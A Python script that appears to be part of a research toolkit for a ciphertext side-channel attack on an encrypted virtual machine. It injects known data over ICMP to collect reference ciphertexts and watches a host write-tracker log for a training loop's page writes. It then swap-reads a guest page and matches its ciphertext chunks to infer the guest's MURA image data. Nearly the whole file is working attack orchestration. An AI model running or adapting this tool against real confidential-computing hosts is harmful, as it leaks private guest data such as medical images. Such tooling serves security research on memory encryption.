#!/usr/bin/env python3
"""
mura_live_first_hit.py -- acquire a FRESH fixed_gpa + FRESH reference
ciphertext(s) right now, save them in memory, THEN tail write-tracker's
log in real time and the instant a plausible real candidate run appears,
swap-read it with the SAME fixed_gpa and compare against the saved
reference ciphertext(s).

Why fresh, not the persistent dict_cache_mura.json: confirmed 2026-08-25
that comparing a fresh candidate against an OLD dict_cache_mura.json
(fixed_gpa + references acquired up to 26 minutes earlier, during the full
--build run) gave 0% match rate even for the verified real ground-truth
image tensor. The dictionary is now built fresh, in-memory, once per
script run, immediately before use -- no persistent JSON, no reuse across
sessions.

--n-ref controls how many of the 64 reference values to acquire (default
1, matching the u8=0-alone precedent already validated for MNIST -- each
ICMP-based acquisition costs several seconds + mdelay pacing, so keep this
small to keep the whole session, and therefore the fixed_gpa's exposure
window, short).

Orchestration (three things running at once, in this order):
  1. host: write_pattern_tracker already armed, writing to a log file
  2. THIS SCRIPT: acquires fresh refs, then tails that same log file
  3. guest: the live MURA iteration loop running

Usage (host, sudo -- run once (1) and (3) above are both already going):
  sudo python3 mura_live_first_hit.py --host-log /path/to/live_host.log \
      --out xor_page_sample.out
"""
import argparse
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from mura_dict_build import (  # noqa: E402
    REF_U8_64, CHUNK_SIZE, PAGE_SIZE,
    acquire_gpa, do_swap_read, parse_dump, SWAP_TOOL,
)

ALIGN_2MB = 0x200000
MIN_RUN, GAP_TOL = 2, 2
DEFAULT_TRIGGER_PAGES = 20

KNOWN_NOISE_BLOCKS = {0x120800000, 0xc0000000, 0x3ce6600000}


def blk(g: int) -> int:
    return g & ~(ALIGN_2MB - 1)


def tail_f(path: Path):
    """Yield new lines appended to path, like tail -f. Starts at EOF --
    only reacts to writes that happen AFTER this script starts, so it
    naturally waits for a fresh, real iteration rather than replaying
    whatever's already in the log."""
    with open(path, errors="ignore") as f:
        f.seek(0, 2)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.05)
                continue
            yield line


def acquire_fresh_dict(n_ref: int, swap_tool: str) -> tuple[int, dict[int, bytes]]:
    """Acquire ONE fresh fixed_gpa, then n_ref fresh reference values (each:
    ICMP-inject the known chunk, swap-read it to fixed_gpa), all right now.
    Returns (fixed_gpa, {u8_val: ciphertext_dump}) -- kept in memory only,
    never persisted to a JSON cache that could go stale."""
    print(f"[fresh] acquiring fixed_gpa...")
    fixed_gpa = acquire_gpa(None)
    print(f"[fresh] fixed_gpa = 0x{fixed_gpa:x}")

    ref_dumps: dict[int, bytes] = {}
    tmp = Path("mura_live_first_hit_ref_tmp.out")
    for i, u8_val in enumerate(REF_U8_64[:n_ref]):
        print(f"[fresh] [{i+1}/{n_ref}] injecting + swap-reading u8={u8_val}...")
        gpa_val = acquire_gpa(u8_val)
        do_swap_read(fixed_gpa, gpa_val, tmp, swap_tool)
        ref_dumps[u8_val] = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    print(f"[fresh] {len(ref_dumps)} reference ciphertext(s) saved in memory")
    return fixed_gpa, ref_dumps


def probe_page_detailed(fixed_gpa: int, page_gpa: int, ref_dumps: dict[int, bytes],
                        swap_tool: str, out_path: Path) -> tuple[int, int]:
    """ONE do_swap_read (same fixed_gpa as the fresh dict above) + full
    chunk-by-chunk match count against the saved reference ciphertext(s)."""
    do_swap_read(fixed_gpa, page_gpa, out_path, swap_tool)
    data = parse_dump(out_path)
    n_chunks = PAGE_SIZE // CHUNK_SIZE
    matched = 0
    for off in range(0, PAGE_SIZE, CHUNK_SIZE):
        chunk = data[off:off + CHUNK_SIZE]
        for ref_bytes in ref_dumps.values():
            if chunk == ref_bytes[off:off + CHUNK_SIZE]:
                matched += 1
                break
    return matched, n_chunks


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host-log", required=True,
                     help="write_pattern_tracker's live output log (already armed/running)")
    ap.add_argument("--out", default="xor_page_sample.out")
    ap.add_argument("--n-ref", type=int, default=1,
                     help="how many of the 64 reference values to acquire fresh "
                          "(default 1 -- keep the session short)")
    ap.add_argument("--trigger-pages", type=int, default=DEFAULT_TRIGGER_PAGES)
    ap.add_argument("--swap-tool", default=str(SWAP_TOOL))
    ap.add_argument("--max-wait", type=int, default=120,
                     help="give up after this many seconds with no trigger (default 120 -- "
                          "kept short so fixed_gpa doesn't sit around getting stale)")
    args = ap.parse_args()

    fixed_gpa, ref_dumps = acquire_fresh_dict(args.n_ref, args.swap_tool)

    log_path = Path(args.host_log)
    print(f"[live] tailing {log_path} ... waiting for a run >= {args.trigger_pages}p "
          f"outside known noise blocks (timeout {args.max_wait}s)")

    base = length = 0
    t0 = time.time()

    for line in tail_f(log_path):
        if time.time() - t0 > args.max_wait:
            print(f"\n[!] timeout ({args.max_wait}s) with no trigger -- fixed_gpa may now "
                  f"be stale, re-run rather than retrying with this session", file=sys.stderr)
            sys.exit(1)

        m = re.match(r'WRITE\s+gpa=0x([0-9a-f]+)\s+ts=(\d+)', line)
        if not m:
            continue
        gpa = int(m.group(1), 16)

        if length == 0:
            base, length = gpa, 1
        else:
            expected = base + length * PAGE_SIZE
            if gpa == expected:
                length += 1
            elif gpa > expected and (gpa - expected) // PAGE_SIZE <= GAP_TOL:
                length += (gpa - expected) // PAGE_SIZE + 1
            else:
                base, length = gpa, 1

        b = blk(base)
        if length >= args.trigger_pages and b not in KNOWN_NOISE_BLOCKS:
            elapsed = time.time() - t0
            print(f"\n[live] TRIGGER (after {elapsed:.1f}s since fresh dict acquired): "
                  f"block=0x{b:x} run=(0x{base:x}, {length}p) -- doing ONE swap-back read now")
            try:
                matched, total = probe_page_detailed(
                    fixed_gpa, base, ref_dumps, args.swap_tool, Path(args.out))
                print(f"[live] page 0x{base:x}: {matched}/{total} chunks matched "
                      f"({matched/total*100:.1f}%)")
                print(f"[live] raw dump saved -> {args.out}")
            except Exception as e:
                print(f"[!] swap-back failed: {e}", file=sys.stderr)
                sys.exit(1)
            return

    print("[!] log ended without a trigger", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
